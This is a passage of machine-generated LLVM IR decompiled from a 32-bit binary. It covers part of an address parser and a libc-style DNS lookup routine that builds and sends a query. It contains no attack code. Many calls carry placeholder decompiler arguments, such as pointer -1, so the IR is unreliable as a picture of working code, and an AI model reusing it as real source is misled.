  %v10_804bf90 = icmp slt i32 %v9_804bf90, 0
  %v11_804bf90 = icmp eq i32 %v2_804bfa734, 3
  %v12_804bf90 = icmp slt i32 %v2_804bfa734, 3
  %v3_804bf94 = icmp eq i1 %v12_804bf90, %v10_804bf90
  %v4_804bf94 = icmp eq i1 %v11_804bf90, false
  %v5_804bf94 = and i1 %v4_804bf94, %v3_804bf94
  br i1 %v5_804bf94, label %dec_label_pc_804bf9e, label %dec_label_pc_804bf96

dec_label_pc_804bf96:                             ; preds = %dec_label_pc_804bf90
  %v10_804bf96 = icmp eq i8 %v2_804bf82, 46
  %v1_804bf99 = icmp eq i1 %v10_804bf96, false
  br i1 %v1_804bf99, label %dec_label_pc_804bfd0, label %dec_label_pc_804bf9b

dec_label_pc_804bf9b:                             ; preds = %dec_label_pc_804bf96
  %v1_804bf9b = add i32 %v0_804bf81, 1
  store i32 %v1_804bf9b, i32* @ecx, align 4
  br label %dec_label_pc_804bfa7

dec_label_pc_804bf9e:                             ; preds = %dec_label_pc_804bf90
  %v1_804bf9e = add i32 %v0_804bf81, 1
  store i32 %v1_804bf9e, i32* @ecx, align 4
  %v4_804bf9f = icmp eq i8 %v2_804bf82, 0
  br i1 %v4_804bf9f, label %dec_label_pc_804bfa7, label %dec_label_pc_804bfa3

dec_label_pc_804bfa3:                             ; preds = %dec_label_pc_804bf9e
  %v2_804bfa3 = and i16 %v5_804bf87, 32
  %v3_804bfa3 = icmp eq i16 %v2_804bfa3, 0
  br i1 %v3_804bfa3, label %dec_label_pc_804bfd0, label %dec_label_pc_804bfa7

dec_label_pc_804bfa7:                             ; preds = %dec_label_pc_804bfa3, %dec_label_pc_804bf9e, %dec_label_pc_804bf9b
  %v0_804bf643 = phi i32 [ %v1_804bf9e, %dec_label_pc_804bfa3 ], [ %v1_804bf9e, %dec_label_pc_804bf9e ], [ %v1_804bf9b, %dec_label_pc_804bf9b ]
  %v3_804bfa7 = add nuw nsw i32 %v2_804bfa734, 1
  %v2_804bfaa = mul i32 %v0_804bfc532, 256
  %v2_804bfad = or i32 %v1_804bf72, %v2_804bfaa
  %v7_804bfb3 = icmp sgt i32 %v2_804bfa734, 3
  br i1 %v7_804bfb3, label %dec_label_pc_804bfb5, label %dec_label_pc_804bf5e

dec_label_pc_804bfb5:                             ; preds = %dec_label_pc_804bfa7
  %v4_804bfb5 = icmp eq i32 %arg2, 0
  br i1 %v4_804bfb5, label %dec_label_pc_804bfd2, label %dec_label_pc_804bfc1

dec_label_pc_804bfc1:                             ; preds = %dec_label_pc_804bfb5
  %v1_804bfc5 = call i32 @llvm.bswap.i32(i32 %v2_804bfad)
  %v2_804bfc7 = inttoptr i32 %arg2 to i32*
  store i32 %v1_804bfc5, i32* %v2_804bfc7, align 4
  br label %dec_label_pc_804bfd2

dec_label_pc_804bfd0:                             ; preds = %dec_label_pc_804bfa3, %dec_label_pc_804bf96, %dec_label_pc_804bf5e, %dec_label_pc_804bf72, %entry
  br label %dec_label_pc_804bfd2

dec_label_pc_804bfd2:                             ; preds = %dec_label_pc_804bfb5, %dec_label_pc_804bfc1, %dec_label_pc_804bfd0
  %v0_804bfd7 = phi i32 [ 1, %dec_label_pc_804bfb5 ], [ 1, %dec_label_pc_804bfc1 ], [ 0, %dec_label_pc_804bfd0 ]
  ret i32 %v0_804bfd7

; uselistorder directives
  uselistorder i32 %v2_804bf84, { 1, 0 }
  uselistorder i32 %v6_804bf82, { 1, 0 }
  uselistorder i8 %v2_804bf82, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804bf81, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804bf79, { 1, 0 }
  uselistorder i32 %v3_804bf75, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804bf6433, { 1, 0 }
  uselistorder i32 %v2_804bfa734, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bfd2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bfd0, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804bf82, { 1, 0 }
  uselistorder label %dec_label_pc_804bf5e, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_804bfee = call i32 @malloc(i32 512)
  store i32 %v2_804bfee, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_804bfee, i32* @ebp, align 4
  %v2_804bffc = call i32 @malloc(i32 1025)
  store i32 %v2_804bffc, i32* %eax.global-to-local, align 4
  %v12_804c005 = ptrtoint i32* %stack_var_-236 to i32
  %v1_804c008 = icmp eq i32 %v2_804bfee, 0
  br i1 %v1_804c008, label %dec_label_pc_804c681, label %dec_label_pc_804c010

dec_label_pc_804c010:                             ; preds = %entry
  %v1_804c010 = icmp eq i32 %v2_804bffc, 0
  br i1 %v1_804c010, label %dec_label_pc_804c681, label %dec_label_pc_804c018

dec_label_pc_804c018:                             ; preds = %dec_label_pc_804c010
  %v5_804c018 = icmp eq i32 %arg2, 0
  br i1 %v5_804c018, label %dec_label_pc_804c681, label %dec_label_pc_804c026

dec_label_pc_804c026:                             ; preds = %dec_label_pc_804c018
  %v4_804c026 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804c026, i32* %eax.global-to-local, align 4
  %v2_804c02d = load i8, i8* %arg1, align 1
  %v3_804c02d = icmp eq i8 %v2_804c02d, 0
  br i1 %v3_804c02d, label %dec_label_pc_804c681, label %dec_label_pc_804c036

dec_label_pc_804c036:                             ; preds = %dec_label_pc_804c026
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_804c03a = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_804c03a, i32* @eax, align 4
  store i32 %v4_804c026, i32* %edx.global-to-local, align 4
  %v2_804c05d = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804c05d, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_804c065 = call i32 @__pthread_return_void(i32 %v2_804c05d, i32 134526883)
  store i32 %v3_804c065, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8052528.84 to i8*), i8** %stack_var_-252, align 4
  %v2_804c071 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8052528.84 to i32))
  %v0_804c076 = load i64, i64* @global_var_8052540.85, align 8
  %v1_804c076 = trunc i64 %v0_804c076 to i32
  %v1_804c07b = ashr i32 %v1_804c076, 31
  %v6_804c07c = and i64 %v0_804c076, 4294967295
  %v8_804c07c = zext i32 %v1_804c07b to i64
  %v9_804c07c = mul nuw i64 %v8_804c07c, 4294967296
  %v10_804c07c = or i64 %v9_804c07c, %v6_804c07c
  %v14_804c07c = srem i64 %v10_804c07c, %tmp33
  %v15_804c07c = trunc i64 %v14_804c07c to i32
  %v0_804c083 = load i16, i16* @global_var_805215c.86, align 4
  %v2_804c092 = load i8*, i8** %stack_var_-252, align 4
  %v3_804c092 = ptrtoint i8* %v2_804c092 to i32
  store i32 %v3_804c092, i32* @eax, align 4
  store i32 134526883, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_804c097 = call i32 @__pthread_return_void(i32 %v2_804c05d, i32 1)
  store i32 %v3_804c097, i32* %eax.global-to-local, align 4
  %v4_804c23e = inttoptr i32 %v15_804c07c to i8*
  %v1_804c65c87 = add i32 %v12_804c005, 28
  %v2_804c65c88 = inttoptr i32 %v1_804c65c87 to i32*
  %v3_804c65c89 = load i32, i32* %v2_804c65c88, align 4
  %tmp = icmp ult i32 %v3_804c65c89, 3
  br i1 %tmp, label %dec_label_pc_804c0bc, label %dec_label_pc_804c681

dec_label_pc_804c0bc:                             ; preds = %dec_label_pc_804c036, %dec_label_pc_804c65c.backedge
  %v0_804c0c395 = phi i32 [ %v0_804c65c.pre, %dec_label_pc_804c65c.backedge ], [ %v12_804c005, %dec_label_pc_804c036 ]
  %v1_804c0bc = add i32 %v0_804c0c395, 20
  %v2_804c0bc = inttoptr i32 %v1_804c0bc to i32*
  %v3_804c0bc = load i32, i32* %v2_804c0bc, align 4
  %v13_804c0bc = icmp eq i32 %v3_804c0bc, -1
  br i1 %v13_804c0bc, label %dec_label_pc_804c0bc.dec_label_pc_804c0d2_crit_edge, label %dec_label_pc_804c0c3

dec_label_pc_804c0bc.dec_label_pc_804c0d2_crit_edge: ; preds = %dec_label_pc_804c0bc
  %v0_804c0d2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c0d2

dec_label_pc_804c0c3:                             ; preds = %dec_label_pc_804c0bc
  %v3_804c0c6 = load i32, i32* %v2_804c0bc, align 4
  %v5_804c0c6 = add i32 %v0_804c0c395, -16
  %v6_804c0c6 = inttoptr i32 %v5_804c0c6 to i32*
  store i32 %v3_804c0c6, i32* %v6_804c0c6, align 4
  %v1_804c0ca = call i32 @__libc_close(i32 -1)
  store i32 %v1_804c0ca, i32* %eax.global-to-local, align 4
  %v0_804c0cf = load i32, i32* @esp, align 4
  %v1_804c0cf = add i32 %v0_804c0cf, 16
  br label %dec_label_pc_804c0d2

dec_label_pc_804c0d2:                             ; preds = %dec_label_pc_804c0bc.dec_label_pc_804c0d2_crit_edge, %dec_label_pc_804c0c3
  %v1_804c0d2 = phi i32 [ %v0_804c0c395, %dec_label_pc_804c0bc.dec_label_pc_804c0d2_crit_edge ], [ %v1_804c0cf, %dec_label_pc_804c0c3 ]
  %v0_804c0d2 = phi i32 [ %v0_804c0d2.pre, %dec_label_pc_804c0bc.dec_label_pc_804c0d2_crit_edge ], [ %v1_804c0ca, %dec_label_pc_804c0c3 ]
  %v2_804c0d2 = add i32 %v1_804c0d2, -4
  %v3_804c0d2 = inttoptr i32 %v2_804c0d2 to i32*
  store i32 %v0_804c0d2, i32* %v3_804c0d2, align 4
  %v1_804c0d3 = add i32 %v1_804c0d2, -8
  %v2_804c0d3 = inttoptr i32 %v1_804c0d3 to i32*
  store i32 512, i32* %v2_804c0d3, align 4
  %v1_804c0d8 = add i32 %v1_804c0d2, -12
  %v2_804c0d8 = inttoptr i32 %v1_804c0d8 to i32*
  store i32 0, i32* %v2_804c0d8, align 4
  %v2_804c0da = add i32 %v1_804c0d2, -16
  %v3_804c0da = inttoptr i32 %v2_804c0da to i32*
  store i32 %v2_804bfee, i32* %v3_804c0da, align 4
  %v4_804c0db = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804c07c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c0db, i32* %eax.global-to-local, align 4
  %v0_804c0e0 = load i32, i32* @esp, align 4
  %v1_804c0e3 = add i32 %v0_804c0e0, 8
  %v2_804c0e3 = inttoptr i32 %v1_804c0e3 to i32*
  store i32 48, i32* %v2_804c0e3, align 4
  %v1_804c0e5 = add i32 %v0_804c0e0, 4
  %v2_804c0e5 = inttoptr i32 %v1_804c0e5 to i32*
  store i32 0, i32* %v2_804c0e5, align 4
  %v1_804c0e7 = add i32 %v0_804c0e0, 84
  store i32 %v1_804c0e7, i32* @ebx, align 4
  %v3_804c0eb = inttoptr i32 %v0_804c0e0 to i32*
  store i32 %v1_804c0e7, i32* %v3_804c0eb, align 4
  %v4_804c0ec = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804c07c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c0ec, i32* %eax.global-to-local, align 4
  %v0_804c0f1 = load i32, i32* @esp, align 4
  %v1_804c0f1 = add i32 %v0_804c0f1, 72
  %v2_804c0f1 = inttoptr i32 %v1_804c0f1 to i32*
  %v3_804c0f1 = load i32, i32* %v2_804c0f1, align 4
  store i32 %v3_804c0f1, i32* %eax.global-to-local, align 4
  %v1_804c0f5 = add i32 %v0_804c0f1, 116
  %v2_804c0f5 = inttoptr i32 %v1_804c0f5 to i32*
  store i32 1, i32* %v2_804c0f5, align 4
  %v0_804c0fd = load i32, i32* @esp, align 4
  %v1_804c0fd = add i32 %v0_804c0fd, 104
  %v2_804c0fd = inttoptr i32 %v1_804c0fd to i32*
  store i32 1, i32* %v2_804c0fd, align 4
  %v0_804c105 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c105 = add i32 %v0_804c105, 1
  %v1_804c106 = urem i32 %v1_804c105, 65536
  store i32 %v1_804c106, i32* %eax.global-to-local, align 4
  %v1_804c10b = load i32, i32* @esp, align 4
  %v2_804c10b = add i32 %v1_804c10b, 72
  %v3_804c10b = inttoptr i32 %v2_804c10b to i32*
  store i32 %v1_804c106, i32* %v3_804c10b, align 4
  %v0_804c10f = load i32, i32* %eax.global-to-local, align 4
  %v1_804c10f = load i32, i32* @esp, align 4
  %v2_804c10f = add i32 %v1_804c10f, 84
  %v3_804c10f = inttoptr i32 %v2_804c10f to i32*
  store i32 %v0_804c10f, i32* %v3_804c10f, align 4
  %v0_804c113 = load i32, i32* @esp, align 4
  %v1_804c116 = add i32 %v0_804c113, 8
  %v2_804c116 = inttoptr i32 %v1_804c116 to i32*
  store i32 512, i32* %v2_804c116, align 4
  %v2_804c11b = add i32 %v0_804c113, 4
  %v3_804c11b = inttoptr i32 %v2_804c11b to i32*
  store i32 %v2_804bfee, i32* %v3_804c11b, align 4
  %v0_804c11c = load i32, i32* @ebx, align 4
  %v3_804c11c = inttoptr i32 %v0_804c113 to i32*
  store i32 %v0_804c11c, i32* %v3_804c11c, align 4
  %v0_804c11d = call i32 @__encode_header()
  store i32 %v0_804c11d, i32* %eax.global-to-local, align 4
  %v0_804c122 = load i32, i32* @esp, align 4
  %v2_804c125 = icmp slt i32 %v0_804c11d, 0
  store i32 %v0_804c11d, i32* @ebx, align 4
  br i1 %v2_804c125, label %dec_label_pc_804c681, label %dec_label_pc_804c12f

dec_label_pc_804c12f:                             ; preds = %dec_label_pc_804c0d2
  %v2_804c12f = add i32 %v0_804c122, 12
  %v3_804c12f = inttoptr i32 %v2_804c12f to i32*
  store i32 %v0_804c11d, i32* %v3_804c12f, align 4
  %v1_804c130 = add i32 %v0_804c122, 8
  %v2_804c130 = inttoptr i32 %v1_804c130 to i32*
  store i32 1025, i32* %v2_804c130, align 4
  %v1_804c135 = add i32 %v0_804c122, 256
  %v2_804c135 = inttoptr i32 %v1_804c135 to i32*
  %v3_804c135 = load i32, i32* %v2_804c135, align 4
  %v5_804c135 = add i32 %v0_804c122, 4
  %v6_804c135 = inttoptr i32 %v5_804c135 to i32*
  store i32 %v3_804c135, i32* %v6_804c135, align 4
  %v1_804c13c = add i32 %v0_804c122, 28
  %v2_804c13c = inttoptr i32 %v1_804c13c to i32*
  %v3_804c13c = load i32, i32* %v2_804c13c, align 4
  %v6_804c13c = inttoptr i32 %v0_804c122 to i32*
  store i32 %v3_804c13c, i32* %v6_804c13c, align 4
  %v5_804c140 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_804c07c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804c145 = load i32, i32* @esp, align 4
  %v1_804c148 = add i32 %v0_804c145, 8
  %v2_804c148 = inttoptr i32 %v1_804c148 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c148, align 4
  %v1_804c14d = add i32 %v0_804c145, 4
  %v2_804c14d = inttoptr i32 %v1_804c14d to i32*
  store i32 134526883, i32* %v2_804c14d, align 4
  %v1_804c152 = add i32 %v0_804c145, 200
  store i32 %v1_804c152, i32* @eax, align 4
  %v3_804c159 = inttoptr i32 %v0_804c145 to i32*
  store i32 %v1_804c152, i32* %v3_804c159, align 4
  %v2_804c15a = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c07c)
  store i32 %v2_804c15a, i32* %eax.global-to-local, align 4
  %v0_804c15f = load i32, i32* @esp, align 4
  %v1_804c15f = inttoptr i32 %v0_804c15f to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c15f, align 4
  %v1_804c166 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c166, i32* %eax.global-to-local, align 4
  %v0_804c16b = load i32, i32* @esp, align 4
  %v1_804c16b = add i32 %v0_804c16b, 56
  %v2_804c16b = inttoptr i32 %v1_804c16b to i32*
  %v3_804c16b = load i32, i32* %v2_804c16b, align 4
  store i32 %v3_804c16b, i32* %edx.global-to-local, align 4
  %v1_804c16f = add i32 %v0_804c16b, 268
  %v2_804c16f = inttoptr i32 %v1_804c16f to i32*
  %v3_804c16f = load i32, i32* %v2_804c16f, align 4
  store i32 %v3_804c16f, i32* %eax.global-to-local, align 4
  %v2_804c176 = mul i32 %v3_804c16b, 4
  %v3_804c176 = add i32 %v3_804c16f, %v2_804c176
  %v4_804c176 = inttoptr i32 %v3_804c176 to i32*
  %v5_804c176 = load i32, i32* %v4_804c176, align 4
  store i32 %v5_804c176, i32* %edx.global-to-local, align 4
  %v2_804c179 = add i32 %v0_804c16b, 48
  %v3_804c179 = inttoptr i32 %v2_804c179 to i32*
  store i32 %v5_804c176, i32* %v3_804c179, align 4
  %v0_804c17d = load i32, i32* @esp, align 4
  %v1_804c17d = add i32 %v0_804c17d, 16
  %v1_804c180 = add i32 %v0_804c17d, 52
  %v2_804c180 = inttoptr i32 %v1_804c180 to i32*
  %v3_804c180 = load i32, i32* %v2_804c180, align 4
  %v5_804c180 = icmp slt i32 %v3_804c180, 0
  br i1 %v5_804c180, label %dec_label_pc_804c12f.dec_label_pc_804c1c6_crit_edge, label %dec_label_pc_804c187

dec_label_pc_804c12f.dec_label_pc_804c1c6_crit_edge: ; preds = %dec_label_pc_804c12f
  %v0_804c1c6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c1c6

dec_label_pc_804c187:                             ; preds = %dec_label_pc_804c12f
  store i32 %v3_804c180, i32* %eax.global-to-local, align 4
  %v1_804c18b = load i32, i32* @global_var_8054998.87, align 8
  %v2_804c18b = sub i32 %v3_804c180, %v1_804c18b
  %v8_804c18b = xor i32 %v1_804c18b, %v3_804c180
  %v9_804c18b = xor i32 %v2_804c18b, %v3_804c180
  %v10_804c18b = and i32 %v9_804c18b, %v8_804c18b
  %v11_804c18b = icmp slt i32 %v10_804c18b, 0
  %v13_804c18b = icmp slt i32 %v2_804c18b, 0
  %v2_804c191 = icmp eq i1 %v13_804c18b, %v11_804c18b
  br i1 %v2_804c191, label %dec_label_pc_804c1c6, label %dec_label_pc_804c193

dec_label_pc_804c193:                             ; preds = %dec_label_pc_804c187
  %v2_804c193 = add i32 %v0_804c17d, 12
  %v3_804c193 = inttoptr i32 %v2_804c193 to i32*
  store i32 %v3_804c180, i32* %v3_804c193, align 4
  %v1_804c194 = add i32 %v0_804c17d, 8
  %v2_804c194 = inttoptr i32 %v1_804c194 to i32*
  store i32 1025, i32* %v2_804c194, align 4
  %v1_804c199 = add i32 %v0_804c17d, 4
  %v2_804c199 = inttoptr i32 %v1_804c199 to i32*
  store i32 ptrtoint (i32* @global_var_805080a.88 to i32), i32* %v2_804c199, align 4
  %v1_804c19e = add i32 %v0_804c17d, 28
  %v2_804c19e = inttoptr i32 %v1_804c19e to i32*
  %v3_804c19e = load i32, i32* %v2_804c19e, align 4
  %v6_804c19e = inttoptr i32 %v0_804c17d to i32*
  store i32 %v3_804c19e, i32* %v6_804c19e, align 4
  %v0_804c1a2 = call i32 @__GI_strncat()
  store i32 %v0_804c1a2, i32* %eax.global-to-local, align 4
  %v0_804c1a7 = load i32, i32* @esp, align 4
  %v1_804c1aa = add i32 %v0_804c1a7, 8
  %v2_804c1aa = inttoptr i32 %v1_804c1aa to i32*
  store i32 1025, i32* %v2_804c1aa, align 4
  %v1_804c1af = add i32 %v0_804c1a7, 52
  %v2_804c1af = inttoptr i32 %v1_804c1af to i32*
  %v3_804c1af = load i32, i32* %v2_804c1af, align 4
  store i32 %v3_804c1af, i32* %edx.global-to-local, align 4
  %v1_804c1b3 = mul i32 %v3_804c1af, 4
  %v2_804c1b3 = add i32 %v1_804c1b3, 134564216
  %v3_804c1b3 = inttoptr i32 %v2_804c1b3 to i32*
  %v4_804c1b3 = load i32, i32* %v3_804c1b3, align 4
  %v6_804c1b3 = add i32 %v0_804c1a7, 4
  %v7_804c1b3 = inttoptr i32 %v6_804c1b3 to i32*
  store i32 %v4_804c1b3, i32* %v7_804c1b3, align 4
  %v1_804c1ba = add i32 %v0_804c1a7, 28
  %v2_804c1ba = inttoptr i32 %v1_804c1ba to i32*
  %v3_804c1ba = load i32, i32* %v2_804c1ba, align 4
  %v6_804c1ba = inttoptr i32 %v0_804c1a7 to i32*
  store i32 %v3_804c1ba, i32* %v6_804c1ba, align 4
  %v0_804c1be = call i32 @__GI_strncat()
  store i32 %v0_804c1be, i32* %eax.global-to-local, align 4
  %v0_804c1c3 = load i32, i32* @esp, align 4
  %v1_804c1c3 = add i32 %v0_804c1c3, 16
  br label %dec_label_pc_804c1c6

dec_label_pc_804c1c6:                             ; preds = %dec_label_pc_804c12f.dec_label_pc_804c1c6_crit_edge, %dec_label_pc_804c187, %dec_label_pc_804c193
  %v1_804c1c6 = phi i32 [ %v1_804c17d, %dec_label_pc_804c12f.dec_label_pc_804c1c6_crit_edge ], [ %v1_804c17d, %dec_label_pc_804c187 ], [ %v1_804c1c3, %dec_label_pc_804c193 ]
  %v0_804c1c6 = phi i32 [ %v0_804c1c6.pre, %dec_label_pc_804c12f.dec_label_pc_804c1c6_crit_edge ], [ %v3_804c180, %dec_label_pc_804c187 ], [ %v0_804c1be, %dec_label_pc_804c193 ]
  %v2_804c1c6 = add i32 %v1_804c1c6, -4
  %v3_804c1c6 = inttoptr i32 %v2_804c1c6 to i32*
  store i32 %v0_804c1c6, i32* %v3_804c1c6, align 4
  %v0_804c1c7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c1c7 = add i32 %v1_804c1c6, -8
  %v3_804c1c7 = inttoptr i32 %v2_804c1c7 to i32*
  store i32 %v0_804c1c7, i32* %v3_804c1c7, align 4
  %v1_804c1c8 = add i32 %v1_804c1c6, -12
  %v2_804c1c8 = inttoptr i32 %v1_804c1c8 to i32*
  store i32 1, i32* %v2_804c1c8, align 4
  %v1_804c1ca = add i32 %v1_804c1c6, 184
  store i32 %v1_804c1ca, i32* @eax, align 4
  %v2_804c1d1 = add i32 %v1_804c1c6, -16
  %v3_804c1d1 = inttoptr i32 %v2_804c1d1 to i32*
  store i32 %v1_804c1ca, i32* %v3_804c1d1, align 4
  %v2_804c1d2 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c07c)
  store i32 %v2_804c1d2, i32* %eax.global-to-local, align 4
  %v0_804c1d7 = load i32, i32* @esp, align 4
  %v1_804c1d7 = add i32 %v0_804c1d7, 28
  %v2_804c1d7 = inttoptr i32 %v1_804c1d7 to i32*
  %v3_804c1d7 = load i32, i32* %v2_804c1d7, align 4
  store i32 %v3_804c1d7, i32* %eax.global-to-local, align 4
  %v1_804c1db = add i32 %v0_804c1d7, 260
  %v2_804c1db = inttoptr i32 %v1_804c1db to i32*
  %v3_804c1db = load i32, i32* %v2_804c1db, align 4
  store i32 %v3_804c1db, i32* @edx, align 4
  %v1_804c1e2 = add i32 %v0_804c1d7, 224
  %v2_804c1e2 = inttoptr i32 %v1_804c1e2 to i32*
  store i32 1, i32* %v2_804c1e2, align 4
  %v0_804c1ed = load i32, i32* %eax.global-to-local, align 4
  %v1_804c1ed = load i32, i32* @esp, align 4
  %v2_804c1ed = add i32 %v1_804c1ed, 216
  %v3_804c1ed = inttoptr i32 %v2_804c1ed to i32*
  store i32 %v0_804c1ed, i32* %v3_804c1ed, align 4
  %v1_804c1f9 = load i32, i32* @ebx, align 4
  %v2_804c1f9 = sub i32 512, %v1_804c1f9
  store i32 %v2_804c1f9, i32* %eax.global-to-local, align 4
  %v0_804c1fb = load i32, i32* @edx, align 4
  %v1_804c1fb = load i32, i32* @esp, align 4
  %v2_804c1fb = add i32 %v1_804c1fb, 220
  %v3_804c1fb = inttoptr i32 %v2_804c1fb to i32*
  store i32 %v0_804c1fb, i32* %v3_804c1fb, align 4
  %v0_804c202 = load i32, i32* @esp, align 4
  %v0_804c205 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c205 = add i32 %v0_804c202, 8
  %v3_804c205 = inttoptr i32 %v2_804c205 to i32*
  store i32 %v0_804c205, i32* %v3_804c205, align 4
  %v1_804c206 = load i32, i32* @ebx, align 4
  %v2_804c206 = add i32 %v1_804c206, %v2_804bfee
  %v2_804c20a = add i32 %v0_804c202, 4
  %v3_804c20a = inttoptr i32 %v2_804c20a to i32*
  store i32 %v2_804c206, i32* %v3_804c20a, align 4
  %v1_804c20b = add i32 %v0_804c202, 216
  store i32 %v1_804c20b, i32* @eax, align 4
  %v3_804c212 = inttoptr i32 %v0_804c202 to i32*
  store i32 %v1_804c20b, i32* %v3_804c212, align 4
  %v0_804c213 = call i32 @__encode_question()
  store i32 %v0_804c213, i32* %eax.global-to-local, align 4
  %v0_804c218 = load i32, i32* @esp, align 4
  %v2_804c21b = icmp slt i32 %v0_804c213, 0
  store i32 %v0_804c213, i32* @esi, align 4
  br i1 %v2_804c21b, label %dec_label_pc_804c681, label %dec_label_pc_804c225

dec_label_pc_804c225:                             ; preds = %dec_label_pc_804c1c6
  %v1_804c225 = add i32 %v0_804c218, 172
  %v2_804c225 = inttoptr i32 %v1_804c225 to i16*
  store i16 2, i16* %v2_804c225, align 2
  %v1_804c22f = load i32, i32* @esp, align 4
  %v2_804c22f = add i32 %v1_804c22f, -4
  %v3_804c22f = inttoptr i32 %v2_804c22f to i32*
  store i32 %v0_804c213, i32* %v3_804c22f, align 4
  %v1_804c230 = add i32 %v1_804c22f, 164
  store i32 %v1_804c230, i32* %eax.global-to-local, align 4
  %v2_804c237 = add i32 %v1_804c22f, -8
  %v3_804c237 = inttoptr i32 %v2_804c237 to i32*
  store i32 %v1_804c230, i32* %v3_804c237, align 4
  %v1_804c238 = add i32 %v1_804c22f, 32
  %v2_804c238 = inttoptr i32 %v1_804c238 to i32*
  %v3_804c238 = load i32, i32* %v2_804c238, align 4
  %v5_804c238 = add i32 %v1_804c22f, -12
  %v6_804c238 = inttoptr i32 %v5_804c238 to i32*
  store i32 %v3_804c238, i32* %v6_804c238, align 4
  %v1_804c23c = add i32 %v1_804c22f, -16
  %v2_804c23c = inttoptr i32 %v1_804c23c to i32*
  store i32 10, i32* %v2_804c23c, align 4
  %v5_804c23e = call i32 @inet_pton(i32 -1, i8* %v4_804c23e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c23e, i32* %eax.global-to-local, align 4
  %v0_804c243 = load i32, i32* @esp, align 4
  %v1_804c243 = add i32 %v0_804c243, 16
  %tmp47 = icmp slt i32 %v5_804c23e, 1
  br i1 %tmp47, label %dec_label_pc_804c254, label %dec_label_pc_804c24a

dec_label_pc_804c24a:                             ; preds = %dec_label_pc_804c225
  %v1_804c24a = add i32 %v0_804c243, 172
  %v2_804c24a = inttoptr i32 %v1_804c24a to i16*
  store i16 10, i16* %v2_804c24a, align 2
  %v0_804c254.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c254

dec_label_pc_804c254:                             ; preds = %dec_label_pc_804c225, %dec_label_pc_804c24a
  %v0_804c26b = phi i32 [ %v1_804c243, %dec_label_pc_804c225 ], [ %v0_804c254.pre, %dec_label_pc_804c24a ]
  %v1_804c254 = add i32 %v0_804c26b, 156
  %v2_804c254 = inttoptr i32 %v1_804c254 to i16*
  %v3_804c254 = load i16, i16* %v2_804c254, align 2
  %v12_804c254 = icmp eq i16 %v3_804c254, 10
  %v1_804c25d = icmp eq i1 %v12_804c254, false
  %v1_804c26b = add i32 %v0_804c26b, 158
  %v2_804c26b = inttoptr i32 %v1_804c26b to i16*
  store i16 13568, i16* %v2_804c26b, align 2
  %v0_804c275 = load i32, i32* @esp, align 4
  br i1 %v1_804c25d, label %dec_label_pc_804c26b, label %dec_label_pc_804c28b

dec_label_pc_804c26b:                             ; preds = %dec_label_pc_804c254
  %v1_804c278 = add i32 %v0_804c275, 32
  %v2_804c278 = inttoptr i32 %v1_804c278 to i32*
  %v3_804c278 = load i32, i32* %v2_804c278, align 4
  %v5_804c278 = add i32 %v0_804c275, -16
  %v6_804c278 = inttoptr i32 %v5_804c278 to i32*
  store i32 %v3_804c278, i32* %v6_804c278, align 4
  %v1_804c27c = call i32 @inet_addr(i32 -1)
  store i32 %v1_804c27c, i32* %eax.global-to-local, align 4
  %v1_804c281 = load i32, i32* @esp, align 4
  %v2_804c281 = add i32 %v1_804c281, 176
  %v3_804c281 = inttoptr i32 %v2_804c281 to i32*
  store i32 %v1_804c27c, i32* %v3_804c281, align 4
  %v0_804c288 = load i32, i32* @esp, align 4
  %v1_804c288 = add i32 %v0_804c288, 16
  br label %dec_label_pc_804c28b

dec_label_pc_804c28b:                             ; preds = %dec_label_pc_804c254, %dec_label_pc_804c26b
